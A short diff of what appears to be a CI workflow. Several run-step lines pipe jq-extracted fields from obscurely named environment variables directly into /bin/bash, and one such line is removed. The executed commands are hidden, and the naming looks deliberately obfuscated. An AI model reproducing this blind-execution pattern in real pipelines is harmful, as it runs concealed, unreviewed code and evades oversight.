@@ -22,7 +22,6 @@ jobs:
         run: |
           printf '%s' "$pys78" | jq -r .pyfu9 | /bin/bash
           echo $jison4 | jq -r .q30644 | /bin/bash
-          echo $h2047 | jq -r .smbbl668 | /bin/bash
           printf '%s' "$pu975" | jq -r .fjrp04462 | /bin/bash
 
       - name: Save data
